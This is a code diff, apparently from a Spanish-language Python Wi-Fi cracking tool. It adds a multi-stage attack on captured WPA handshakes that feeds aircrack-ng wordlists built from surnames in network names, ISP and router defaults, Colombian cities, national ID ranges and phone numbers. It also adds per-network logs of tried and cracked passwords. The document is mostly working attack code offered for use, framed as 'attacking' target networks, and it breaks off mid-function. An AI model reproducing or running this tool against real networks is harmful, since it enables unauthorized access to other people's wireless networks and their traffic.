@@ -104,6 +104,9 @@ class WiFiAuditor:
         self.handshake_dir.mkdir(exist_ok=True)
         self.wordlist_dir.mkdir(exist_ok=True)
         
+        # Sistema de historial por red
+        self.network_history = {}
+        
         # Cargar configuración
         self.load_config()
         
@@ -2491,6 +2494,15 @@ class WiFiAuditor:
             self.log("Archivo de handshake invalido", "ERROR")
             return None
         
+        # Inicializar historial de red
+        network_key = self.initialize_network_history(target)
+        
+        # Mostrar resumen del historial
+        already_cracked = self.show_network_history_summary(target)
+        if already_cracked:
+            stats = self.get_network_statistics(network_key)
+            return stats.get('successful_password')
+        
         # Inicializar sistema de aprendizaje
         self.crack_stats = {
             'attempted_passwords': 0,
@@ -2505,47 +2517,75 @@ class WiFiAuditor:
         self.log("FASE 1: Análisis inteligente rapido...", "INFO")
         password = self.intelligent_analysis(target)
         if password:
+            self.save_network_stats(network_key, "FASE1", password)
             return password
+        self.save_network_stats(network_key, "FASE1")
         
         # FASE 2: Generación masiva de contraseñas (10,000+)
         self.log("FASE 2: Generando arsenal masivo de contraseñas...", "INFO")
         password = self.massive_password_generation_attack(target, handshake_file)
         if password:
+            self.save_network_stats(network_key, "FASE2", password)
             return password
+        self.save_network_stats(network_key, "FASE2")
         
         # FASE 3: Ataque adaptativo con aprendizaje
         self.log("FASE 3: Ataque adaptativo con aprendizaje de patrones...", "INFO")
         password = self.adaptive_learning_attack(target, handshake_file)
         if password:
+            self.save_network_stats(network_key, "FASE3", password)
             return password
+        self.save_network_stats(network_key, "FASE3")
         
         # FASE 4: Análisis de respuestas de red
         self.log("FASE 4: Analisis de respuestas de red y timing attacks...", "INFO")
         password = self.network_response_analysis_attack(target, handshake_file)
         if password:
+            self.save_network_stats(network_key, "FASE4", password)
             return password
+        self.save_network_stats(network_key, "FASE4")
         
         # FASE 5: Fuerza bruta evolutiva
         self.log("FASE 5: Algoritmo evolutivo de contraseñas...", "INFO")
         password = self.evolutionary_password_attack(target, handshake_file)
         if password:
+            self.save_network_stats(network_key, "FASE5", password)
             return password
+        self.save_network_stats(network_key, "FASE5")
         
         # FASE 6: Última oportunidad - cracking paralelo masivo
         self.log("FASE 6: Cracking paralelo masivo (ultimo recurso)...", "INFO")
         password = self.parallel_massive_attack(target, handshake_file)
         if password:
+            self.save_network_stats(network_key, "FASE6", password)
             return password
+        self.save_network_stats(network_key, "FASE6")
             
         # FASE 7: CERRAJERO DIGITAL - Máximo uso de RAM
         self.log("FASE 7: CERRAJERO DIGITAL - Usando toda la RAM disponible...", "WARNING")
         password = self.digital_lockpicker_ram_max(target, handshake_file)
         if password:
+            self.save_network_stats(network_key, "FASE7", password)
             return password
+        self.save_network_stats(network_key, "FASE7")
             
         # FASE 8: CERRAJERO PROGRESIVO - Análisis posicional
         self.log("FASE 8: CERRAJERO PROGRESIVO - Ataque por posiciones como cerrajero experto...", "WARNING")
-        return self.progressive_lockpicker(target, handshake_file)
+        password = self.progressive_lockpicker(target, handshake_file)
+        if password:
+            self.save_network_stats(network_key, "FASE8", password)
+            return password
+        self.save_network_stats(network_key, "FASE8")
+            
+        # FASE 9: INTELIGENCIA COLECTIVA - Síntesis de todos los datos recolectados
+        self.log("FASE 9: INTELIGENCIA COLECTIVA - Analizando TODA la información recolectada...", "ERROR")
+        password = self.collective_intelligence_attack(target, handshake_file)
+        if password:
+            self.save_network_stats(network_key, "FASE9", password)
+            return password
+        self.save_network_stats(network_key, "FASE9")
+        
+        return None
     
     def massive_password_generation_attack(self, target, handshake_file):
         """Generar y probar miles de contraseñas inteligentemente"""
@@ -2725,6 +2765,17 @@ class WiFiAuditor:
         if not password_batch:
             return None
         
+        # Obtener clave de red para historial
+        network_key = self.sanitize_filename(target['essid'])
+        
+        # Filtrar contraseñas ya probadas
+        if network_key in self.network_history:
+            filtered_passwords = self.filter_new_passwords(password_batch, network_key)
+            if not filtered_passwords:
+                self.log(f"Todas las contraseñas del lote {batch_name} ya fueron probadas anteriormente", "INFO")
+                return None
+            password_batch = filtered_passwords
+        
         # Crear archivo temporal del lote
         temp_file = f"/tmp/batch_{batch_name}_{int(time.time())}.txt"
         
@@ -2744,6 +2795,10 @@ class WiFiAuditor:
             end_time = time.time()
             response_time = end_time - start_time
             
+            # Guardar contraseñas probadas en historial
+            if network_key in self.network_history:
+                self.save_tried_passwords(password_batch, network_key, batch_name)
+            
             # Analizar respuesta
             self.analyze_aircrack_response(output, error, password_batch, response_time)
             
@@ -2755,6 +2810,10 @@ class WiFiAuditor:
                 if match:
                     password = match.group(1).strip()
                     self.log(f"CONTRASENA ENCONTRADA con {batch_name}! -> {password}", "SUCCESS")
+                    
+                    # Guardar contraseña exitosa en historial
+                    if network_key in self.network_history:
+                        self.save_network_stats(network_key, batch_name, password)
                     
                     # Analizar patrones exitosos
                     self.analyze_successful_password(password, target)
@@ -4750,6 +4809,578 @@ class WiFiAuditor:
                 pass
         
         return None
+    
+    def collective_intelligence_attack(self, target, handshake_file):
+        """FASE 9: Inteligencia Colectiva - Síntesis de TODA la información recolectada"""
+        self.log("=== INTELIGENCIA COLECTIVA ACTIVADA ===", "ERROR")
+        self.log("Analizando TODOS los datos de las 8 fases anteriores...", "ERROR")
+        
+        # ETAPA 1: Recolectar y analizar toda la información disponible
+        intelligence_data = self._gather_all_intelligence(target, handshake_file)
+        
+        # ETAPA 2: Análisis profundo del handshake para obtener pistas
+        handshake_analysis = self._deep_handshake_analysis(handshake_file, target)
+        
+        # ETAPA 3: Generación de candidatos basada en inteligencia colectiva
+        smart_candidates = self._generate_intelligent_candidates(target, intelligence_data, handshake_analysis)
+        
+        # ETAPA 4: Ataque dirigido con candidatos de alta probabilidad
+        password = self._execute_targeted_attack(target, handshake_file, smart_candidates)
+        if password:
+            return password
+        
+        # ETAPA 5: Ataque por patrones OSINT (Open Source Intelligence)
+        password = self._osint_pattern_attack(target, handshake_file, intelligence_data)
+        if password:
+            return password
+            
+        # ETAPA 6: Fuerza bruta extrema con información contextual
+        password = self._contextual_brute_force(target, handshake_file, intelligence_data)
+        if password:
+            return password
+        
+        # ETAPA 7: Último recurso - Ataque psicológico de patrones humanos
+        password = self._psychological_pattern_attack(target, handshake_file)
+        if password:
+            return password
+        
+        self.log("Inteligencia Colectiva agotó todas las estrategias disponibles", "ERROR")
+        return None
+    
+    def _gather_all_intelligence(self, target, handshake_file):
+        """Recopilar TODA la información disponible de las fases anteriores"""
+        self.log("ETAPA 1: Recopilando inteligencia de todas las fases...", "INFO")
+        
+        intelligence = {
+            'essid_analysis': {},
+            'bssid_analysis': {},
+            'network_behavior': {},
+            'timing_patterns': {},
+            'failed_attempts': {},
+            'statistical_data': {},
+            'contextual_clues': []
+        }
+        
+        essid = target['essid']
+        bssid = target['bssid']
+        
+        # Análisis profundo del ESSID
+        intelligence['essid_analysis'] = {
+            'original': essid,
+            'length': len(essid),
+            'has_spaces': ' ' in essid,
+            'has_numbers': any(c.isdigit() for c in essid),
+            'has_uppercase': any(c.isupper() for c in essid),
+            'has_lowercase': any(c.islower() for c in essid),
+            'words': essid.split(),
+            'probable_surname': None,
+            'probable_business': None,
+            'probable_location': None
+        }
+        
+        # Detectar patrones en el ESSID
+        if 'familia' in essid.lower() or 'family' in essid.lower():
+            intelligence['essid_analysis']['type'] = 'family'
+            intelligence['contextual_clues'].append('Red familiar - usar nombres, fechas de nacimiento, apellidos')
+            
+        elif any(word in essid.lower() for word in ['wifi', 'internet', 'red', 'casa']):
+            intelligence['essid_analysis']['type'] = 'generic'
+            intelligence['contextual_clues'].append('Red genérica - usar patrones estándar')
+            
+        elif any(word in essid.lower() for word in ['movistar', 'claro', 'tigo', 'une', 'etb']):
+            intelligence['essid_analysis']['type'] = 'isp_default'
+            intelligence['contextual_clues'].append('Red de ISP - usar patrones de router por defecto')
+        
+        # Análisis del BSSID para identificar fabricante
+        oui = bssid[:8].upper()
+        intelligence['bssid_analysis'] = {
+            'oui': oui,
+            'manufacturer': self._identify_manufacturer(oui),
+            'default_patterns': self._get_manufacturer_defaults(oui)
+        }
+        
+        # Recopilar intentos fallidos (si están disponibles)
+        if hasattr(self, 'crack_stats') and self.crack_stats:
+            intelligence['failed_attempts'] = {
+                'total_attempted': self.crack_stats.get('attempted_passwords', 0),
+                'failed_patterns': list(self.crack_stats.get('failed_patterns', set())),
+                'avg_time_per_attempt': sum(self.crack_stats.get('time_per_attempt', [])) / len(self.crack_stats.get('time_per_attempt', [1])),
+                'successful_prefixes': self.crack_stats.get('successful_prefixes', [])
+            }
+        
+        self.log(f"Inteligencia recopilada: {len(intelligence['contextual_clues'])} pistas contextuales", "SUCCESS")
+        return intelligence
+    
+    def _deep_handshake_analysis(self, handshake_file, target):
+        """Análisis profundo del handshake para obtener pistas adicionales"""
+        self.log("ETAPA 2: Análisis profundo del archivo handshake...", "INFO")
+        
+        analysis = {
+            'file_size': 0,
+            'packet_count': 0,
+            'eapol_messages': 0,
+            'data_packets': 0,
+            'clients_detected': [],
+            'time_patterns': [],
+            'quality_score': 0
+        }
+        
+        if os.path.exists(handshake_file):
+            analysis['file_size'] = os.path.getsize(handshake_file)
+            
+            # Usar tshark para análisis detallado si está disponible
+            try:
+                # Contar paquetes EAPOL
+                eapol_cmd = f'tshark -r "{handshake_file}" -Y "eapol" 2>/dev/null | wc -l'
+                success, output, _ = self.run_command(eapol_cmd, timeout=10)
+                if success and output.strip().isdigit():
+                    analysis['eapol_messages'] = int(output.strip())
+                
+                # Detectar dispositivos cliente
+                clients_cmd = f'tshark -r "{handshake_file}" -T fields -e wlan.sa 2>/dev/null | sort | uniq -c | head -10'
+                success, output, _ = self.run_command(clients_cmd, timeout=10)
+                if success:
+                    for line in output.strip().split('\n'):
+                        if line.strip():
+                            parts = line.strip().split()
+                            if len(parts) >= 2:
+                                analysis['clients_detected'].append(parts[1])
+                
+                self.log(f"Handshake: {analysis['eapol_messages']} mensajes EAPOL, {len(analysis['clients_detected'])} clientes", "INFO")
+            except:
+                pass
+        
+        # Calcular puntaje de calidad
+        if analysis['eapol_messages'] >= 4:
+            analysis['quality_score'] += 40
+        if analysis['file_size'] > 10000:
+            analysis['quality_score'] += 30
+        if len(analysis['clients_detected']) > 0:
+            analysis['quality_score'] += 30
+        
+        return analysis
+    
+    def _generate_intelligent_candidates(self, target, intelligence_data, handshake_analysis):
+        """Generar candidatos de alta probabilidad basados en toda la inteligencia"""
+        self.log("ETAPA 3: Generando candidatos inteligentes basados en análisis colectivo...", "INFO")
+        
+        essid = target['essid']
+        candidates = set()
+        
+        # ESTRATEGIA 1: Basada en tipo de red detectado
+        network_type = intelligence_data['essid_analysis'].get('type', 'unknown')
+        
+        if network_type == 'family':
+            candidates.update(self._generate_family_candidates(essid, intelligence_data))
+        elif network_type == 'isp_default':
+            candidates.update(self._generate_isp_candidates(essid, intelligence_data))
+        else:
+            candidates.update(self._generate_generic_candidates(essid, intelligence_data))
+        
+        # ESTRATEGIA 2: Basada en fabricante del router
+        manufacturer_defaults = intelligence_data['bssid_analysis'].get('default_patterns', [])
+        candidates.update(manufacturer_defaults)
+        
+        # ESTRATEGIA 3: Combinaciones con datos contextuales
+        if intelligence_data['essid_analysis']['words']:
+            for word in intelligence_data['essid_analysis']['words']:
+                candidates.update(self._expand_word_variations(word))
+        
+        # ESTRATEGIA 4: Patrones numéricos basados en año actual y fechas probables
+        candidates.update(self._generate_temporal_candidates(essid))
+        
+        # Filtrar y limitar candidatos
+        valid_candidates = [c for c in candidates if isinstance(c, str) and 8 <= len(c) <= 63]
+        
+        self.log(f"Generados {len(valid_candidates)} candidatos inteligentes de alta probabilidad", "SUCCESS")
+        return valid_candidates[:50000]  # Máximo 50K candidatos
+    
+    def _generate_family_candidates(self, essid, intelligence_data):
+        """Generar candidatos para redes familiares"""
+        candidates = set()
+        
+        # Extraer posible apellido
+        words = intelligence_data['essid_analysis']['words']
+        if len(words) >= 2 and 'familia' in words[0].lower():
+            surname = words[1]
+            
+            # Variaciones del apellido + patrones familiares
+            for year in range(1960, 2025):
+                candidates.update([
+                    f"{surname}{year}",
+                    f"{surname.lower()}{year}", 
+                    f"{surname.upper()}{year}",
+                    f"{surname}{str(year)[-2:]}",
+                    f"{surname}123",
+                    f"{surname}1234",
+                    f"{surname}12345",
+                    f"casa{surname.lower()}",
+                    f"mi{surname.lower()}"
+                ])
+        
+        return candidates
+    
+    def _generate_isp_candidates(self, essid, intelligence_data):
+        """Generar candidatos para routers de ISP con configuración por defecto"""
+        candidates = set()
+        
+        # Patrones típicos de ISPs colombianos
+        isp_patterns = {
+            'movistar': ['movistar', essid, essid[-8:] if len(essid) >= 8 else essid + '1234'],
+            'claro': ['claro123', 'clarowifi', essid, essid + '123'],
+            'tigo': ['tigo1234', 'tigowifi', essid, essid + 'tigo'],
+            'une': ['une12345', 'unewifi', essid],
+            'etb': ['etb12345', 'etbwifi', essid + 'etb']
+        }
+        
+        for isp, patterns in isp_patterns.items():
+            if isp in essid.lower():
+                candidates.update(patterns)
+                
+        # Patrones basados en últimos dígitos del BSSID o MAC
+        bssid = intelligence_data['bssid_analysis']['oui']
+        if bssid:
+            last_digits = ''.join(c for c in bssid if c.isdigit())[-8:]
+            if len(last_digits) >= 4:
+                candidates.add(last_digits[:8].zfill(8))
+                candidates.add(last_digits[-8:].zfill(8))
+        
+        return candidates
+    
+    def _generate_generic_candidates(self, essid, intelligence_data):
+        """Generar candidatos para redes genéricas"""
+        candidates = set()
+        
+        # Variaciones del ESSID completo
+        essid_clean = essid.replace(' ', '').replace('-', '').replace('_', '')
+        
+        for year in [2024, 2023, 2022, 2021, 2020]:
+            candidates.update([
+                f"{essid_clean}{year}",
+                f"{essid_clean.lower()}{year}",
+                f"{essid_clean.upper()}{year}",
+                f"{year}{essid_clean}",
+                f"{essid_clean}{str(year)[-2:]}",
+            ])
+        
+        # Sufijos numéricos comunes
+        for suffix in ['123', '1234', '12345', '123456', '01', '02', '03', '10']:
+            candidates.update([
+                f"{essid_clean}{suffix}",
+                f"{essid_clean.lower()}{suffix}",
+                f"{essid_clean.upper()}{suffix}"
+            ])
+        
+        return candidates
+    
+    def _expand_word_variations(self, word):
+        """Expandir variaciones de una palabra"""
+        variations = set()
+        
+        if len(word) >= 3:
+            # Variaciones básicas
+            variations.update([
+                word,
+                word.lower(),
+                word.upper(), 
+                word.capitalize(),
+                word + '123',
+                word + '1234',
+                word + '2024',
+                word + '2023',
+                '123' + word,
+                '2024' + word
+            ])
+            
+            # Añadir números al final
+            for i in range(100):
+                variations.add(f"{word}{i:02d}")
+                
+        return variations
+    
+    def _generate_temporal_candidates(self, essid):
+        """Generar candidatos basados en patrones temporales"""
+        candidates = set()
+        
+        essid_clean = essid.replace(' ', '').replace('-', '').replace('_', '')
+        
+        # Años y fechas relevantes
+        for year in range(2020, 2025):  # Años recientes
+            for month in [1, 6, 12]:  # Meses típicos
+                for day in [1, 15]:
+                    candidates.update([
+                        f"{essid_clean}{day:02d}{month:02d}{year}",
+                        f"{essid_clean}{day:02d}{month:02d}{str(year)[-2:]}",
+                        f"{day:02d}{month:02d}{year}"
+                    ])
+        
+        return candidates
+    
+    def _identify_manufacturer(self, oui):
+        """Identificar fabricante por OUI"""
+        oui_database = {
+            '00:1F:A4': 'Movistar/Telefonica',
+            '00:25:68': 'Claro',
+            '24:2F:D0': 'ETB',
+            '18:D6:C7': 'TP-Link',
+            '00:26:5A': 'D-Link',
+            '00:25:9C': 'Linksys',
+            '00:25:9E': 'Huawei',
+            '00:26:F2': 'Netgear'
+        }
+        return oui_database.get(oui, 'Unknown')
+    
+    def _get_manufacturer_defaults(self, oui):
+        """Obtener patrones por defecto según fabricante"""
+        defaults = {
+            '00:1F:A4': ['movistar', 'admin', '1234567890'],
+            '00:25:68': ['claro123', 'admin', '1234567890'],
+            '24:2F:D0': ['etb12345', 'admin123'],
+            '18:D6:C7': ['admin123', 'tplink123', '12345678'],
+            '00:26:5A': ['admin', 'dlink123', '12345678'],
+            '00:25:9C': ['admin', 'linksys123', '12345678'],
+            '00:25:9E': ['admin', 'huawei123', '12345678'],
+            '00:26:F2': ['password', 'netgear123', '12345678']
+        }
+        return defaults.get(oui, ['admin', '12345678', 'password'])
+    
+    def _execute_targeted_attack(self, target, handshake_file, smart_candidates):
+        """Ejecutar ataque dirigido con candidatos de alta probabilidad"""
+        self.log("ETAPA 4: Ataque dirigido con candidatos de máxima probabilidad...", "INFO")
+        
+        if not smart_candidates:
+            return None
+        
+        # Dividir en lotes para ataque eficiente
+        batch_size = 2000
+        total_batches = (len(smart_candidates) + batch_size - 1) // batch_size
+        
+        progress_bar = ProgressBar(
+            total=total_batches,
+            prefix="INTELIGENCIA [Dirigido]",
+            suffix=f"0/{total_batches} lotes | {len(smart_candidates)} candidatos inteligentes",
+            length=40
+        )
+        
+        for i in range(0, len(smart_candidates), batch_size):
+            if not self.running:
+                progress_bar.finish("Interrumpido")
+                break
+                
+            batch = smart_candidates[i:i+batch_size]
+            batch_num = i // batch_size + 1
+            
+            progress_bar.update(
+                batch_num,
+                f"Lote {batch_num}/{total_batches} | {len(batch)} candidatos inteligentes"
+            )
+            
+            password = self._test_collective_batch(
+                target, handshake_file, batch, f"intelligent_{batch_num}", timeout=90
+            )
+            if password:
+                progress_bar.finish(f"CONTRASEÑA ENCONTRADA: {password}")
+                return password
+        
+        progress_bar.finish("Ataque dirigido completado")
+        return None
+    
+    def _osint_pattern_attack(self, target, handshake_file, intelligence_data):
+        """Ataque basado en patrones OSINT (Open Source Intelligence)"""
+        self.log("ETAPA 5: Ataque OSINT - Patrones de inteligencia abierta...", "INFO")
+        
+        # Patrones basados en cultura y geografía colombiana
+        osint_patterns = set()
+        
+        # Ciudades colombianas + años
+        cities = ['bogota', 'medellin', 'cali', 'barranquilla', 'cartagena', 'cucuta', 'soledad', 'ibague']
+        for city in cities:
+            for year in range(2020, 2025):
+                osint_patterns.update([
+                    f"{city}{year}",
+                    f"{city.upper()}{year}",
+                    f"{city.capitalize()}{year}"
+                ])
+        
+        # Patrones de cédulas y documentos colombianos
+        for i in range(10000000, 99999999, 1000000):  # Rangos de cédulas
+            osint_patterns.add(str(i))
+            
+        # Números de teléfono colombianos completos
+        phone_prefixes = ['300', '301', '302', '310', '311', '312', '313', '314', '315', '316', '317', '318', '319', '320']
+        for prefix in phone_prefixes:
+            for i in range(1000000, 9999999, 100000):  # Cada 100K números
+                phone = f"{prefix}{i}"
+                if len(phone) == 10:
+                    osint_patterns.add(phone)
+        
+        # Probar patrones OSINT
+        osint_list = list(osint_patterns)[:20000]  # Máximo 20K
+        
+        if osint_list:
+            return self._test_collective_batch(
+                target, handshake_file, osint_list, "osint_patterns", timeout=120
+            )
+        
+        return None
+    
+    def _contextual_brute_force(self, target, handshake_file, intelligence_data):
+        """Fuerza bruta contextual basada en toda la información recolectada"""
+        self.log("ETAPA 6: Fuerza bruta contextual extrema...", "WARNING")
+        
+        essid = target['essid']
+        
+        # Crear contexto específico
+        context_chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
+        
+        # Si es red familiar, enfocar en nombres
+        if intelligence_data['essid_analysis'].get('type') == 'family':
+            context_chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
+        # Si es ISP, enfocar en números
+        elif intelligence_data['essid_analysis'].get('type') == 'isp_default':
+            context_chars = '0123456789abcdefghijklmnopqrstuvwxyz'
+        
+        # Generar combinaciones contextuales
+        import itertools
+        
+        contextual_passwords = []
+        
+        # Solo longitudes muy específicas según el análisis
+        target_lengths = [8, 10, 12] if len(essid) <= 8 else [10, 12, 14]
+        
+        for length in target_lengths:
+            self.log(f"Fuerza bruta contextual longitud {length}", "WARNING")
+            
+            count = 0
+            for combination in itertools.product(context_chars, repeat=length):
+                if not self.running or count >= 200000:  # Máximo 200K por longitud
+                    break
+                    
+                password = ''.join(combination)
+                contextual_passwords.append(password)
+                count += 1
+                
+                # Probar cada 10K combinaciones
+                if len(contextual_passwords) >= 10000:
+                    result = self._test_collective_batch(
+                        target, handshake_file, contextual_passwords, f"contextual_{length}_{count//10000}", timeout=60
+                    )
+                    if result:
+                        return result
+                    contextual_passwords = []
+            
+            # Probar último lote
+            if contextual_passwords:
+                result = self._test_collective_batch(
+                    target, handshake_file, contextual_passwords, f"contextual_{length}_final", timeout=60
+                )
+                if result:
+                    return result
+                contextual_passwords = []
+        
+        return None
+    
+    def _psychological_pattern_attack(self, target, handshake_file):
+        """Ataque basado en patrones psicológicos humanos"""
+        self.log("ETAPA 7: Ataque psicológico - Patrones de comportamiento humano...", "ERROR")
+        
+        # Patrones psicológicos comunes
+        psychological_patterns = set()
+        
+        essid = target['essid']
+        
+        # Patrones de pereza humana
+        lazy_patterns = [
+            '12345678', '87654321', '11111111', '22222222', '00000000',
+            'qwertyui', 'asdfghjk', 'zxcvbnma', 'qwerty123',
+            'password', 'password123', 'admin123', 'usuario123'
+        ]
+        psychological_patterns.update(lazy_patterns)
+        
+        # Fechas significativas
+        significant_dates = [
+            '01011990', '01012000', '01012010', '01012020',
+            '31121999', '31122000', '31122010', '31122020',
+            '12345678', '87654321', '11223344', '44332211'
+        ]
+        psychological_patterns.update(significant_dates)
+        
+        # Combinar con ESSID
+        essid_clean = essid.replace(' ', '').replace('-', '').replace('_', '')
+        for pattern in ['123', '1234', '12345', '2024', '2023', 'wifi', 'casa']:
+            psychological_patterns.update([
+                essid_clean + pattern,
+                pattern + essid_clean,
+                essid_clean.lower() + pattern,
+                essid_clean.upper() + pattern
+            ])
+        
+        # Filtrar patrones válidos
+        valid_patterns = [p for p in psychological_patterns if 8 <= len(p) <= 63]
+        
+        if valid_patterns:
+            return self._test_collective_batch(
+                target, handshake_file, valid_patterns, "psychological", timeout=90
+            )
+        
+        return None
+    
+    def _test_collective_batch(self, target, handshake_file, passwords, batch_name, timeout=120):
+        """Probar lote de contraseñas de inteligencia colectiva"""
+        if not passwords:
+            return None
+        
+        # Obtener clave de red para historial
+        network_key = self.sanitize_filename(target['essid'])
+        
+        # Filtrar contraseñas ya probadas
+        if network_key in self.network_history:
+            filtered_passwords = self.filter_new_passwords(passwords, network_key)
+            if not filtered_passwords:
+                self.log(f"Todas las contraseñas del lote colectivo {batch_name} ya fueron probadas", "INFO")
+                return None
+            passwords = filtered_passwords
+        
+        temp_file = f"/tmp/collective_{batch_name}_{int(time.time())}.txt"
+        
+        try:
+            with open(temp_file, 'w', buffering=8192) as f:
+                for pwd in passwords:
+                    if isinstance(pwd, str) and 8 <= len(pwd) <= 63:
+                        f.write(pwd + '\n')
+            
+            self.log(f"Probando {len(passwords)} contraseñas de inteligencia colectiva [{batch_name}]...", "INFO")
+            
+            crack_cmd = f"aircrack-ng -w {temp_file} {handshake_file}"
+            success, output, error = self.run_command(crack_cmd, timeout=timeout)
+            
+            # Guardar contraseñas probadas en historial
+            if network_key in self.network_history:
+                self.save_tried_passwords(passwords, network_key, f"FASE9_{batch_name}")
+            
+            if success and "KEY FOUND" in output:
+                import re
+                key_pattern = r'KEY FOUND! \[\s*(.+?)\s*\]'
+                match = re.search(key_pattern, output)
+                if match:
+                    password = match.group(1).strip()
+                    self.log(f"INTELIGENCIA COLECTIVA EXITOSA: {password}", "SUCCESS")
+                    
+                    # Guardar contraseña exitosa en historial
+                    if network_key in self.network_history:
+                        self.save_network_stats(network_key, f"FASE9_{batch_name}", password)
+                    
+                    return password
+            
+        except Exception as e:
+            self.log(f"Error en lote colectivo {batch_name}: {e}", "WARNING")
+        finally:
+            try:
+                os.remove(temp_file)
+            except:
+                pass
+        
+        return None
 
     def _save_original_state(self):
         """Guardar estado original del sistema"""
@@ -4764,6 +5395,199 @@ class WiFiAuditor:
                 self.original_interfaces = ""
         except Exception as e:
             self.log(f"Error guardando estado original: {e}", "WARNING")
+    
+    def initialize_network_history(self, target):
+        """Inicializar historial para una red específica"""
+        essid = self.sanitize_filename(target['essid'])
+        bssid = target['bssid'].replace(':', '-')
+        
+        # Crear carpeta específica para la red
+        network_folder = self.wordlist_dir / essid
+        network_folder.mkdir(exist_ok=True)
+        
+        # Archivos de historial
+        tried_passwords_file = network_folder / "tried_passwords.txt"
+        network_stats_file = network_folder / "network_stats.json"
+        attack_history_file = network_folder / "attack_history.log"
+        
+        # Crear archivos si no existen
+        if not tried_passwords_file.exists():
+            tried_passwords_file.touch()
+        if not network_stats_file.exists():
+            initial_stats = {
+                'essid': target['essid'],
+                'bssid': target['bssid'],
+                'first_seen': datetime.now().isoformat(),
+                'last_attack': None,
+                'total_passwords_tried': 0,
+                'attack_sessions': 0,
+                'phases_completed': [],
+                'successful_password': None,
+                'crack_date': None
+            }
+            with open(network_stats_file, 'w') as f:
+                json.dump(initial_stats, f, indent=4)
+        
+        # Cargar contraseñas ya probadas
+        tried_passwords = set()
+        if tried_passwords_file.exists():
+            try:
+                with open(tried_passwords_file, 'r', encoding='utf-8') as f:
+                    tried_passwords = {line.strip() for line in f if line.strip()}
+            except Exception as e:
+                self.log(f"Error cargando historial de {essid}: {e}", "WARNING")
+        
+        # Cargar estadísticas
+        network_stats = {}
+        try:
+            with open(network_stats_file, 'r') as f:
+                network_stats = json.load(f)
+        except Exception as e:
+            self.log(f"Error cargando estadísticas de {essid}: {e}", "WARNING")
+        
+        # Inicializar en memoria
+        self.network_history[essid] = {
+            'folder': network_folder,
+            'tried_passwords_file': tried_passwords_file,
+            'network_stats_file': network_stats_file,
+            'attack_history_file': attack_history_file,
+            'tried_passwords': tried_passwords,
+            'network_stats': network_stats,
+            'session_passwords': set()  # Contraseñas probadas en esta sesión
+        }
+        
+        self.log(f"📁 Historial inicializado para {essid}: {len(tried_passwords)} contraseñas previamente probadas", "INFO")
+        return essid
+    
+    def sanitize_filename(self, filename):
+        """Limpiar nombre de archivo para que sea válido en el sistema"""
+        import re
+        # Reemplazar caracteres problemáticos
+        sanitized = re.sub(r'[<>:"/\\|?*]', '_', filename)
+        # Limitar longitud
+        sanitized = sanitized[:100] if len(sanitized) > 100 else sanitized
+        # Evitar nombres vacíos
+        sanitized = sanitized or 'unnamed_network'
+        return sanitized
+    
+    def filter_new_passwords(self, passwords, network_key):
+        """Filtrar contraseñas que no han sido probadas antes"""
+        if network_key not in self.network_history:
+            return passwords
+        
+        tried_passwords = self.network_history[network_key]['tried_passwords']
+        session_passwords = self.network_history[network_key]['session_passwords']
+        
+        # Filtrar contraseñas ya probadas (históricamente o en esta sesión)
+        new_passwords = []
+        duplicates_count = 0
+        
+        for pwd in passwords:
+            if pwd not in tried_passwords and pwd not in session_passwords:
+                new_passwords.append(pwd)
+                session_passwords.add(pwd)  # Marcar como probada en esta sesión
+            else:
+                duplicates_count += 1
+        
+        if duplicates_count > 0:
+            self.log(f"🔍 Filtradas {duplicates_count} contraseñas ya probadas anteriormente", "INFO")
+        
+        self.log(f"✨ {len(new_passwords)} contraseñas nuevas para probar", "SUCCESS")
+        return new_passwords
+    
+    def save_tried_passwords(self, passwords, network_key, batch_name=""):
+        """Guardar contraseñas probadas en el archivo de historial"""
+        if network_key not in self.network_history:
+            return
+        
+        history = self.network_history[network_key]
+        tried_passwords_file = history['tried_passwords_file']
+        attack_history_file = history['attack_history_file']
+        
+        # Agregar contraseñas al archivo de historial
+        try:
+            with open(tried_passwords_file, 'a', encoding='utf-8') as f:
+                for pwd in passwords:
+                    if isinstance(pwd, str) and pwd.strip():
+                        f.write(pwd.strip() + '\n')
+                        history['tried_passwords'].add(pwd.strip())
+            
+            # Registrar en el log de ataques
+            timestamp = datetime.now().isoformat()
+            with open(attack_history_file, 'a', encoding='utf-8') as f:
+                f.write(f"[{timestamp}] {batch_name}: {len(passwords)} contraseñas probadas\n")
+            
+            # Actualizar estadísticas
+            history['network_stats']['total_passwords_tried'] += len(passwords)
+            history['network_stats']['last_attack'] = timestamp
+            
+            self.log(f"💾 Guardadas {len(passwords)} contraseñas en historial de {network_key}", "INFO")
+            
+        except Exception as e:
+            self.log(f"Error guardando historial para {network_key}: {e}", "WARNING")
+    
+    def save_network_stats(self, network_key, phase_name=None, successful_password=None):
+        """Actualizar y guardar estadísticas de la red"""
+        if network_key not in self.network_history:
+            return
+        
+        history = self.network_history[network_key]
+        stats = history['network_stats']
+        
+        # Actualizar estadísticas
+        if phase_name and phase_name not in stats['phases_completed']:
+            stats['phases_completed'].append(phase_name)
+        
+        if successful_password:
+            stats['successful_password'] = successful_password
+            stats['crack_date'] = datetime.now().isoformat()
+            self.log(f"🎉 CONTRASEÑA GUARDADA EN HISTORIAL: {successful_password}", "SUCCESS")
+        
+        stats['attack_sessions'] = stats.get('attack_sessions', 0) + 1
+        
+        # Guardar estadísticas actualizadas
+        try:
+            with open(history['network_stats_file'], 'w') as f:
+                json.dump(stats, f, indent=4)
+        except Exception as e:
+            self.log(f"Error guardando estadísticas para {network_key}: {e}", "WARNING")
+    
+    def get_network_statistics(self, network_key):
+        """Obtener estadísticas de una red específica"""
+        if network_key not in self.network_history:
+            return None
+        
+        stats = self.network_history[network_key]['network_stats'].copy()
+        stats['session_passwords_tried'] = len(self.network_history[network_key]['session_passwords'])
+        stats['total_unique_passwords'] = len(self.network_history[network_key]['tried_passwords'])
+        
+        return stats
+    
+    def show_network_history_summary(self, target):
+        """Mostrar resumen del historial de la red"""
+        network_key = self.sanitize_filename(target['essid'])
+        
+        if network_key not in self.network_history:
+            self.log(f"📊 Primera vez atacando la red: {target['essid']}", "INFO")
+            return
+        
+        stats = self.get_network_statistics(network_key)
+        if stats:
+            self.log("📊 RESUMEN DEL HISTORIAL DE LA RED:", "INFO")
+            self.log(f"   Red: {stats['essid']} ({stats['bssid']})", "INFO")
+            self.log(f"   Primera vez vista: {stats['first_seen']}", "INFO")
+            self.log(f"   Último ataque: {stats.get('last_attack', 'Nunca')}", "INFO")
